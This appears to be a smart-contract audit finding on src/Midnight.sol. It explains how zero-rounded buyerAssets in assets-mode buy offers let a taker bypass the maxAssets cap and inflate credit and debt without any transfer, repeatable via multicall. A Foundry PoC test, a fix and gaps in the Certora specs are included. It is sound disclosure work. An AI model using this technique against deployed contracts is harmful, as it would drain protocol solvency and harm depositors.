Audit Report

## Title
Zero-`buyerAssets` rounding bypasses `maxAssets` cap and breaks solvency invariant on assets-mode buy offers at sub-WAD price — (`src/Midnight.sol`)

## Summary
When a buy offer uses `maxAssets` mode and `tickToPrice(offer.tick)` is small enough that `units * buyerPrice < WAD`, `mulDivDown` rounds `buyerAssets` to zero. The `consumed` mapping is incremented by zero, so the `maxAssets` cap check always passes regardless of prior consumption. Position state (`credit`, `debt`, `totalUnits`) is updated using the raw `units` value while zero loan tokens are transferred, permanently breaking the solvency invariant that every credit unit has a matching asset deposit.

## Finding Description

**Root cause** — `src/Midnight.sol` line 363: `mulDivDown` rounds `buyerAssets` to zero when `units * buyerPrice < WAD`. [1](#0-0) 

**Cap check bypass** — lines 367–369: `consumed` is incremented by `buyerAssets` (= 0), so `newConsumed` never advances past `maxAssets`, and `require(newConsumed <= offer.maxAssets)` always passes even on a fully-consumed offer. [2](#0-1) 

**Position state updated with raw `units`** — lines 382 and 408–410: `buyerCreditIncrease` is derived from `units`, not `buyerAssets`, so `buyerPos.credit` increases by `units` while zero tokens are deposited. [3](#0-2) [4](#0-3) 

**Zero token transfer** — line 455 transfers `buyerAssets - sellerAssets = 0 - 0 = 0`. [5](#0-4) 

**Why existing checks fail:**
- The `maxAssets` cap check at line 369 passes because `+= 0` leaves `newConsumed` unchanged.
- `Consume.spec` summarizes `mulDivDown`/`mulDivUp` as `NONDET`, so the Certora prover never evaluates the zero-rounding case. [6](#0-5) 
- `fullyConsumedOfferRevertsOnNonTrivialTake` only covers `maxAssets == 0` (units mode); no equivalent rule exists for assets mode. [7](#0-6) 
- `takeConsumedAtMaxUnchangedAssets` (lines 88–97) only asserts `consumed` is unchanged — which is trivially true when `+= 0` — but does not assert `units == 0`. [8](#0-7) 

**Developer-written PoC** — `test/TakeTest.sol` lines 857–889 (`testBugBuyMaxAssetsBypass`) pre-fills `consumed` to `maxAssets`, calls `take(1, borrower, lenderOffer)`, and asserts `buyerAssets == 0`, `consumed` unchanged, yet `lender.credit`, `borrower.debt`, and `totalUnits` all strictly increase. [9](#0-8) 

## Impact Explanation

Each zero-asset take: (1) increases the lender's `credit` by `units` without any loan-token deposit, meaning the contract's balance no longer covers all credit redemptions — the core solvency invariant is broken; (2) increases the borrower's `debt` by `units` without the borrower receiving any assets; (3) invokes the maker's `onBuy` callback with `buyerAssets = 0`, potentially triggering unintended maker-side logic; (4) never advances `consumed`, making the attack repeatable an unbounded number of times on the same offer in a single transaction via `multicall`. This constitutes direct theft of protocol solvency and unauthorized state manipulation, both in-scope critical impacts.

## Likelihood Explanation

Preconditions are minimal: the offer must use `maxAssets` mode and be placed at any tick where `tickToPrice(tick) < WAD` (satisfied by any tick below `MAX_TICK`). The taker only needs to pass the ratifier check — for Merkle-tree or signature-based ratifiers this is a standard user action. No privileged access is required. The attack is repeatable in a single transaction via `multicall`, amplifying impact to arbitrary scale.

## Recommendation

Add a guard requiring `buyerAssets > 0` whenever `units > 0` in assets mode, or use `mulDivUp` for the `consumed` increment on buy offers so that any non-zero `units` always advances the cap. A minimal fix at line 368:

```solidity
uint256 assetsConsumed = offer.buy ? units.mulDivUp(buyerPrice, WAD) : buyerAssets;
require(assetsConsumed > 0 || units == 0, ZeroAssetTake());
newConsumed = consumed[offer.maker][offer.group] += assetsConsumed;
```

Additionally, add a Certora rule analogous to `fullyConsumedOfferRevertsOnNonTrivialTake` for assets mode, and remove the `NONDET` summary for `mulDivDown`/`mulDivUp` in `Consume.spec` so the prover evaluates rounding edge cases.

## Proof of Concept

The developer-written test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol` lines 857–889 is a complete, self-contained PoC: [10](#0-9) 

Run with:
```
forge test --match-test testBugBuyMaxAssetsBypass -vvvv
```
Expected result: test passes, demonstrating that `buyerAssets == 0`, `consumed` is unchanged at `maxAssets`, yet `creditOf(id, lender)`, `debtOf(id, borrower)`, and `totalUnits(id)` all strictly increase — confirming the solvency invariant is broken without any token transfer.

### Citations

**File:** src/Midnight.sol (L363-364)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);
```

**File:** src/Midnight.sol (L367-369)
```text
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** src/Midnight.sol (L382-382)
```text
        uint256 buyerCreditIncrease = UtilsLib.zeroFloorSub(units, buyerPos.debt);
```

**File:** src/Midnight.sol (L408-410)
```text
        buyerPos.debt -= UtilsLib.toUint128(units - buyerCreditIncrease);
        buyerPos.pendingFee += buyerPendingFeeIncrease;
        buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);
```

**File:** src/Midnight.sol (L455-456)
```text
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** certora/specs/Consume.spec (L11-12)
```text
    function UtilsLib.mulDivDown(uint256, uint256, uint256) internal returns (uint256) => NONDET;
    function UtilsLib.mulDivUp(uint256, uint256, uint256) internal returns (uint256) => NONDET;
```

**File:** certora/specs/Consume.spec (L88-97)
```text
/// If consumed is already at or above maxAssets before a take in assets mode, it remains unchanged.
rule takeConsumedAtMaxUnchangedAssets(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiver, address takerCallback, bytes takerCallbackData) {
    require offer.maxUnits == 0;

    uint256 consumedBefore = consumed(offer.maker, offer.group);

    take(e, offer, ratifierData, units, taker, receiver, takerCallback, takerCallbackData);

    assert consumedBefore >= offer.maxAssets => consumed(offer.maker, offer.group) == consumedBefore;
}
```

**File:** certora/specs/Consume.spec (L99-110)
```text
/// A fully-consumed offer in units mode only allows no-op takes.
rule fullyConsumedOfferRevertsOnNonTrivialTake(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiver, address takerCallback, bytes takerCallbackData) {
    require offer.maxAssets == 0;

    uint256 consumedBefore = consumed(offer.maker, offer.group);

    require offer.maxUnits > 0 && consumedBefore >= offer.maxUnits, "assume the offer is fully consumed";

    take(e, offer, ratifierData, units, taker, receiver, takerCallback, takerCallbackData);

    // If take does not revert, its input has to be zero.
    assert units == 0;
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
